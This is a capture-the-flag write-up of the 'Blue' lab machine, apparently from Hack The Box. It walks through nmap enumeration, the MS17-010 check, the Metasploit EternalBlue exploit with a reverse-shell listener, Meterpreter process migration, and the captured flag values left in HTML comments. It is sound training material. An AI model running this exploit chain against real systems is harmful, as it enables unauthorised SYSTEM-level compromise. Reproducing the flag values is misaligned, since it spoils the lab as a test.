---
title: Blue
description: Windows 7 SP1 with SMB wide open. One CVE, one command, straight to SYSTEM — and a lesson in why Meterpreter session stability matters.
---

# Blue

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows 7 Professional SP1 |
| **CVE** | MS17-010 / CVE-2017-0143 (EternalBlue) |

Blue is a single-CVE box, and deliberately so.
The machine exists to teach EternalBlue in a controlled environment —
the same vulnerability that powered WannaCry and NotPetya in 2017.

The attack chain is short: find SMB, confirm the vulnerability, exploit it, land as SYSTEM.
No lateral movement, no privilege escalation step, no rabbit holes.
What makes this box valuable is not the complexity but the depth of understanding you can build around one critical vulnerability.

---

## Setup

Kali VM via QEMU on host. VPN config transferred from the host via a quick HTTP server and pulled with curl.

```bash
# on host
python3 -m http.server 8000

# on Kali VM
curl http://192.168.122.1:8000/machines_eu-dedivip-4.ovpn -o machines_eu-dedivip-4.ovpn
openvpn machines_eu-dedivip-4.ovpn
```

The VPN connected cleanly — `Initialization Sequence Completed` confirmed the tunnel was up.
The assigned IP on `tun0` was `10.10.15.139`.

The IPv6 errors in the output (`Network is unreachable`) are harmless — the VM has no IPv6 gateway,
so those routes simply fail silently. The IPv4 tunnel works fine.

If HTTP traffic through the tunnel hangs while ping works, the MTU is the culprit.
The VPN server pushes `tun-mtu 1500` but the QEMU NAT layer can't carry packets that large:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

Start with a connectivity check, then a full service scan:

```bash
ping 10.129.24.204
nmap -sC -sV -Pn 10.129.24.204
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152-49157/tcp open msrpc   Microsoft Windows RPC
```

The host information from the SMB scripts filled in the picture immediately:

| Detail | Value |
|--------|-------|
| OS | Windows 7 Professional 7601 Service Pack 1 |
| Computer name | HARIS-PC |
| Workgroup | WORKGROUP |
| SMB signing | Disabled |
| Guest auth | Allowed |

Two things stand out.
First: Windows 7 SP1. End of life since January 2020, meaning no security patches for over six years.
Second: SMB is open and signing is disabled. That combination on an unpatched Windows 7 machine has one name.

---

## Vulnerability Discovery

Nmap ships a script that checks specifically for MS17-010 without triggering the exploit:

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.129.24.204
```

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

Confirmed. The box is vulnerable to EternalBlue.

---

## Exploitation

### What EternalBlue actually does

MS17-010 is a buffer overflow in the way Windows SMBv1 handles `Transaction2` requests.
A malformed packet triggers a corruption of the kernel's non-paged pool memory.
Metasploit uses this corruption to inject shellcode directly into the kernel —
which means the payload runs with kernel privileges before any user-space security mechanism can interfere.

The grooming output in the exploit log tells this story step by step:

- **SMBv2 buffers** are sent to fill the heap with controlled allocations
- **The SMBv1 connection is closed** to create a free hole in exactly the right position
- **More SMBv2 buffers** lock the surrounding memory in place
- **The exploit packet** overwrites the freed hole and corrupts the pool
- **The egg** is delivered to the corrupted connection and the payload executes

Because execution happens in the kernel, the session comes back as `NT AUTHORITY\SYSTEM` immediately.

### Running the exploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.24.204
set LHOST 10.10.15.139
run
```

The first run landed a session but it was unstable — running `cat` on the Administrator flag returned:

```
[-] stdapi_fs_stat: Operation failed: Not enough storage is available to process this command.
```

This is a known issue with EternalBlue sessions. The Meterpreter payload lands inside an unstable kernel thread. Certain operations — including spawning a child process like `cmd.exe` — exceed what that thread can handle and crash the session. The fix is to immediately migrate to a stable user-space process after landing:

```
meterpreter > migrate -N spoolsv.exe
```

`spoolsv.exe` (the Windows print spooler) runs as SYSTEM and is always present. Migrating into it moves the payload from the fragile kernel thread into a stable process, and all subsequent operations work normally.

On the second run the exploit retried automatically with a higher groom count (17 instead of 12) and the session came back cleanly.

```
[+] 10.129.24.204:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
meterpreter >
```

---

## Flags

With a SYSTEM session, both flags are directly readable. No privilege escalation needed.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat C:\\Users\\haris\\Desktop\\user.txt
```

<!-- f4cadb1bca1e93aa62cd33f3135e5ee6 -->

**User flag captured.**

```
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
```

<!-- b0dd39104a46b1fb10f228648845d99f -->

**Root flag captured. Box complete.**

---

!!! example "Conclusion"
    Blue is deliberately simple — the learning is in understanding why EternalBlue works, not just that it works.
    The kernel pool grooming, the SMBv1/SMBv2 interplay, the reason the session lands as SYSTEM without any extra steps — these are worth understanding, not just memorising the Metasploit commands.

    The unstable session issue was a good bonus lesson. EternalBlue sessions are fragile until migrated.
    On any real engagement — or on the CJCA exam — the first thing to do after landing a Meterpreter shell is migrate into a stable process. `spoolsv.exe` or `explorer.exe` are reliable targets.

    From the defensive side: this box is a perfect illustration of why unpatched SMBv1 on an internet-facing or internal machine is a critical finding. MS17-010 requires no credentials, no user interaction, and no foothold. It goes from zero to SYSTEM in under a minute.
